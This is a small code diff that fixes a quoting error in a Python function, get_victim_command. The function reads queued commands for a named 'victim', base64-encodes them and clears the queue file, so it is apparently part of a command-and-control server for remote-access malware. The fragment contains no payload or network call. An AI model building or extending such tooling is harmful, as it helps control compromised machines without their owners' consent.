@@ -26,7 +26,7 @@ def get_victim_command(victim_name, path):
     file.close()
     
     if(content):
-        command = f"c:{base64.b64encode(content.encode("ascii"))}"
+        command = f"c:{base64.b64encode(content.encode('ascii'))}"
         Path(f"{path}/Commands/{victim_name}.txt").open(mode="w").close()  # to clear the command file after issuing commands
         return command
         
